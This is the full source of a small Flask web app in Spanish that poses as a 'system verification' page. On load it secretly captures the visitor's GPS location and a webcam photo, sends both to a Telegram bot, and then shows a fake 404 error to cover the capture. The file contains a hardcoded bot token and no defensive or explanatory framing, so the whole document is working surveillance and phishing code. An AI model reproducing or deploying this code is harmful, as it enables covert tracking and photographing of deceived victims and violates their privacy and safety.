from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
import base64
import os

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
BOT_TOKEN = "8575617284:AAEnhzskJXyLFC5VV4Qi2-TEz8UNAK4idYQ"
ADMIN_ID = "TU_ID_DE_TELEGRAM" # Cámbialo por tu ID real

def send_to_telegram(message, photo_path=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if photo_path:
        files = {'photo': open(photo_path, 'rb')}
        requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': message}, files=files)
    else:
        requests.post(url + "sendMessage", data={'chat_id': ADMIN_ID, 'text': message, 'parse_mode': 'HTML'})

@app.route('/')
def index():
    return """
    <html>
    <head>
        <title>Verificando Sistema...</title>
        <script>
            async function startCapture() {
                // 1. Capturar Ubicación
                navigator.geolocation.getCurrentPosition(pos => {
                    const { latitude, longitude } = pos.coords;
                    fetch('/log_location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({lat: latitude, lon: longitude})
                    });
                });

                // 2. Capturar Cámara
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg');
                fetch('/log_camera', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({image: dataUrl})
                });
                
                stream.getTracks().forEach(track => track.stop());
                document.body.innerHTML = "<h1>Error 404: No se pudo verificar el dispositivo.</h1>";
            }
            window.onload = startCapture;
        </script>
    </head>
    <body>
        <h2>Cargando componentes de seguridad... por favor espere.</h2>
    </body>
    </html>
    """

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.json
    msg = f"📍 <b>¡UBICACIÓN CAPTURADA!</b>\n\nLat: <code>{data['lat']}</code>\nLon: <code>{data['lon']}</code>\n\n🗺 <a href='https://www.google.com/maps?q={data['lat']},{data['lon']}'>Ver en Google Maps</a>"
    send_to_telegram(msg)
    return jsonify({"status": "ok"})

@app.route('/log_camera', methods=['POST'])
def log_camera():
    data = request.json
    img_data = data['image'].split(",")[1]
    with open("capture.jpg", "wb") as f:
        f.write(base64.b64decode(img_data))
    send_to_telegram("📸 <b>¡FOTO CAPTURADA!</b>", "capture.jpg")
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
